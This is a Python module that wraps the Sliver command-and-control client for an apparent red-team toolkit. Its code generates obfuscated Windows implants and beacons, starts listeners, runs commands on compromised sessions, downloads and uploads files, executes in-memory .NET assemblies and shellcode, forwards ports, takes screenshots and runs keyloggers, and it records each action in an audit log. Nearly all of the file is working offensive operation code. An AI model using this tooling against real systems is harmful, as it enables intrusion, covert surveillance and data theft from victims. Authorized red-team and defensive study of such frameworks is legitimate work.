"""Sliver C2 gRPC Client — Real implementation for implant management."""

from __future__ import annotations
import json
import os
import subprocess
import tempfile
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Optional

try:
    import grpc  # optional: gRPC path needs grpcio; CLI fallback works without it
except Exception:  # pragma: no cover
    grpc = None

# Import generated protobuf (will be generated from sliver proto)
# For now, we use the sliver-client binary as fallback
# TODO: Generate proper gRPC stubs from sliver protobuf


@dataclass
class SliverImplant:
    """Sliver implant configuration."""
    name: str
    profile: str = "http"  # http, https, dns, mtls
    lhost: str = ""
    lport: int = 0
    format: str = "exe"  # exe, dll, shellcode, service
    arch: str = "amd64"
    os: str = "windows"
    obfuscate: bool = True
    skip_symbols: bool = True
    output: str = ""


@dataclass
class SliverListener:
    """Sliver listener configuration."""
    name: str
    profile: str = "http"
    bind_addr: str = "0.0.0.0"
    port: int = 80
    mtls: bool = False


@dataclass
class SliverSession:
    """Active Sliver session."""
    id: str
    implant_name: str
    remote_addr: str
    username: str
    os: str
    arch: str
    pid: int
    process: str
    last_checkin: str
    alive: bool = True


class SliverClient:
    """
    Sliver C2 client using gRPC (preferred) or CLI fallback.
    
    Requires: sliver-server running with mTLS, operator config generated.
    Setup: 
      1. sliver-server --config /path/to/server.cfg
      2. sliver-client import /path/to/operator.cfg
      3. Set RT_SLIVER_* env vars or config.yaml
    """

    def __init__(self, config=None):
        from modules.redteam.config import get_config
        if config is not None and hasattr(config, 'sliver'):
            # Full RedTeamConfig passed, extract sliver section
            self.config = config.sliver
        elif config is not None and hasattr(config, 'server'):
            # SliverConfig passed directly
            self.config = config
        else:
            # Default
            self.config = get_config().sliver
        self._grpc_stub = None
        self._channel = None
        self._use_grpc = False
        self._init_grpc()

    def _init_grpc(self):
        """Initialize gRPC connection with mTLS."""
        try:
            if grpc is None:
                return
            # Load certs
            ca = Path(self.config.ca_cert).read_bytes() if self.config.ca_cert else None
            cert = Path(self.config.client_cert).read_bytes() if self.config.client_cert else None
            key = Path(self.config.client_key).read_bytes() if self.config.client_key else None
            
            if not all([ca, cert, key]):
                return
            
            creds = grpc.ssl_channel_credentials(
                root_certificates=ca,
                private_key=key,
                certificate_chain=cert
            )
            target = f"{self.config.server}:{self.config.port}"
            self._channel = grpc.secure_channel(target, creds)
            # TODO: Import generated stub
            # from sliver.proto import sliver_pb2_grpc
            # self._grpc_stub = sliver_pb2_grpc.SliverRPCStub(self._channel)
            self._use_grpc = True
        except Exception:
            self._use_grpc = False

    # ==================== HIGH-LEVEL OPERATIONS ====================

    def generate_implant(self, implant: SliverImplant) -> dict[str, Any]:
        """
        Generate implant binary.
        Returns: {"success": bool, "path": str, "error": str, "metadata": dict}
        """
        # Validate
        if not implant.name:
            return {"success": False, "error": "Implant name required"}
        
        # Determine output path
        output = implant.output or str(
            Path.home() / ".attack_surface" / "redteam_results" / "implants" / f"{implant.name}.{implant.format}"
        )
        Path(output).parent.mkdir(parents=True, exist_ok=True)
        
        # Build sliver-client command
        cmd = [
            "sliver-client", "generate",
            "--name", implant.name,
            "--format", implant.format,
            "--arch", implant.arch,
            "--os", implant.os,
            "--lhost", implant.lhost or self.config.lhost or self._auto_lhost(),
            "--lport", str(implant.lport or self.config.lport or 0),
            "--profile", implant.profile,
            "--save", output,
        ]
        
        if implant.obfuscate:
            cmd.append("--obfuscate")
        if implant.skip_symbols:
            cmd.append("--skip-symbols")
        
        return self._run_cli(cmd, "implant_generate", {"name": implant.name, "output": output})

    def generate_beacon(self, name: str, profile: str = "http", 
                        lhost: str = "", lport: int = 0,
                        format: str = "exe", **kwargs) -> dict[str, Any]:
        """Quick beacon generation."""
        implant = SliverImplant(
            name=name, profile=profile, lhost=lhost, lport=lport,
            format=format, **kwargs
        )
        return self.generate_implant(implant)

    def start_listener(self, listener: SliverListener) -> dict[str, Any]:
        """Start a Sliver listener."""
        cmd = [
            "sliver-client", "listener", "start",
            "--name", listener.name,
            "--profile", listener.profile,
            "--bind", listener.bind_addr,
            "--port", str(listener.port),
        ]
        if listener.mtls:
            cmd.append("--mtls")
        
        return self._run_cli(cmd, "listener_start", {"name": listener.name})

    def stop_listener(self, name: str) -> dict[str, Any]:
        """Stop a listener."""
        cmd = ["sliver-client", "listener", "stop", "--name", name]
        return self._run_cli(cmd, "listener_stop", {"name": name})

    def list_listeners(self) -> dict[str, Any]:
        """List all listeners."""
        cmd = ["sliver-client", "listeners"]
        return self._run_cli(cmd, "list_listeners", {"action": "list"})

    def list_sessions(self) -> list[SliverSession]:
        """List active sessions."""
        cmd = ["sliver-client", "sessions", "--format", "json"]
        result = self._run_cli(cmd, "list_sessions", {"action": "list"})
        if result.get("success") and result.get("output"):
            try:
                sessions = json.loads(result["output"])
                return [SliverSession(**s) for s in sessions]
            except Exception:
                pass
        return []

    def interact_session(self, session_id: str, command: str) -> dict[str, Any]:
        """Execute command on a session."""
        cmd = ["sliver-client", "session", "interact", "--id", session_id, "-c", command]
        return self._run_cli(cmd, "session_interact", {"session_id": session_id, "command": command})

    def download_file(self, session_id: str, remote_path: str, local_path: str) -> dict[str, Any]:
        """Download file from session."""
        cmd = ["sliver-client", "download", "--id", session_id, remote_path, local_path]
        return self._run_cli(cmd, "download", {"session_id": session_id, "remote": remote_path})

    def upload_file(self, session_id: str, local_path: str, remote_path: str) -> dict[str, Any]:
        """Upload file to session."""
        cmd = ["sliver-client", "upload", "--id", session_id, local_path, remote_path]
        return self._run_cli(cmd, "upload", {"session_id": session_id, "local": local_path})

    def execute_assembly(self, session_id: str, assembly_path: str, args: str = "") -> dict[str, Any]:
        """Execute .NET assembly in memory."""
        cmd = ["sliver-client", "execute-assembly", "--id", session_id, assembly_path]
        if args:
            cmd.extend(["--args", args])
        return self._run_cli(cmd, "execute_assembly", {"session_id": session_id, "assembly": assembly_path})

    def execute_shellcode(self, session_id: str, shellcode_path: str) -> dict[str, Any]:
        """Execute raw shellcode."""
        cmd = ["sliver-client", "execute-shellcode", "--id", session_id, shellcode_path]
        return self._run_cli(cmd, "execute_shellcode", {"session_id": session_id, "shellcode": shellcode_path})

    def portfwd_start(self, session_id: str, local_port: int, remote_host: str, remote_port: int) -> dict[str, Any]:
        """Start port forward."""
        cmd = [
            "sliver-client", "portfwd", "start",
            "--id", session_id,
            "--local", str(local_port),
            "--remote", f"{remote_host}:{remote_port}"
        ]
        return self._run_cli(cmd, "portfwd_start", {"session_id": session_id, "local": local_port})

    def screenshot(self, session_id: str) -> dict[str, Any]:
        """Take screenshot."""
        cmd = ["sliver-client", "screenshot", "--id", session_id]
        return self._run_cli(cmd, "screenshot", {"session_id": session_id})

    def keylogger_start(self, session_id: str) -> dict[str, Any]:
        """Start keylogger."""
        cmd = ["sliver-client", "keylogger", "start", "--id", session_id]
        return self._run_cli(cmd, "keylogger_start", {"session_id": session_id})

    def keylogger_stop(self, session_id: str) -> dict[str, Any]:
        """Stop keylogger and get logs."""
        cmd = ["sliver-client", "keylogger", "stop", "--id", session_id]
        return self._run_cli(cmd, "keylogger_stop", {"session_id": session_id})

    # ==================== HELPERS ====================

    def _auto_lhost(self) -> str:
        """Auto-detect LHOST for reverse connections."""
        import socket
        try:
            # Connect to a public IP to determine outbound interface
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
        except Exception:
            return "127.0.0.1"

    def _run_cli(self, cmd: list[str], operation: str, meta: dict) -> dict[str, Any]:
        """Run sliver-client CLI command with timeout and audit."""
        import shlex
        from modules.redteam.config import get_config
        
        cfg = get_config()
        timeout = self.config.timeout or cfg.default_timeout
        
        # Audit log
        self._audit(operation, " ".join(shlex.quote(c) for c in cmd), meta)
        
        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                env={**os.environ, "SLIVER_CLIENT_CONFIG": str(Path.home() / ".sliver" / "client.cfg")}
            )
            return {
                "success": proc.returncode == 0,
                "output": proc.stdout.strip(),
                "error": proc.stderr.strip() if proc.returncode != 0 else "",
                "returncode": proc.returncode,
                "operation": operation,
                "meta": meta
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "error": f"Timeout after {timeout}s", "operation": operation, "meta": meta}
        except FileNotFoundError:
            return {"success": False, "error": "sliver-client not found in PATH", "operation": operation, "meta": meta}
        except Exception as e:
            return {"success": False, "error": str(e), "operation": operation, "meta": meta}

    def _audit(self, operation: str, command: str, meta: dict):
        """Write to audit log."""
        from modules.redteam.config import get_config
        import datetime
        cfg = get_config()
        Path(cfg.audit_log).parent.mkdir(parents=True, exist_ok=True)
        entry = {
            "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
            "operator": self.config.operator,
            "operation": operation,
            "command": command,
            "meta": meta
        }
        with open(cfg.audit_log, "a") as f:
            f.write(json.dumps(entry) + "\n")

    def close(self):
        """Close gRPC channel."""
        if self._channel:
            self._channel.close()


# Convenience function for Action Center integration
def sliver_generate_implant(name: str, profile: str = "http", **kwargs) -> dict[str, Any]:
    """Quick function for Action Center: generate implant."""
    client = SliverClient()
    return client.generate_beacon(name, profile, **kwargs)


def sliver_start_listener(name: str, profile: str = "http", port: int = 80) -> dict[str, Any]:
    """Quick function for Action Center: start listener."""
    client = SliverClient()
    listener = SliverListener(name=name, profile=profile, port=port)
    return client.start_listener(listener)


def sliver_list_sessions() -> list[SliverSession]:
    """Quick function for Action Center: list sessions."""
    client = SliverClient()
    return client.list_sessions()